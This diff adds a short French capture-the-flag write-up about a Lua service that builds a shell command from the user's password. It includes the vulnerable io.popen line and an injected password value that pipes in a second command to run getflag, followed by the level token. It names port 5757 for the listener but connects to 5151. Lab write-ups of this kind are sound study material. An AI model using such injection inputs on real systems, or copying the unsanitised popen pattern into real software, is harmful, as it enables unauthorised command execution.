@@ -1,0 +1,17 @@
+# En arrivant sur le home on voit un fichier lua qui execute un listener sur le 127.0.0.1:5757
+# En lisant le code on s'apercoit que le programme va nous demander un mot de passe qu'il vas hasher et comparer
+# mais en regardant de plus pret les deux sortie du if else ne servent a rien
+
+#En cherchant bien on vois que la solution est dans la fonction de hash qui utilise un fonction qui prend une commande
+# shell concatene avec notre mot de passe. 
+
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+# notre faille est ici, en rentrant un petit trick avec des pipe en mot de passe on peut recuperer le flag
+
+netcat 127.0.0.1 5151
+Password: hehe | echo `getflag` > /tmp/azur/flag
+
+#il nous reste plus qu'a cat /tmp/azur/flag
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
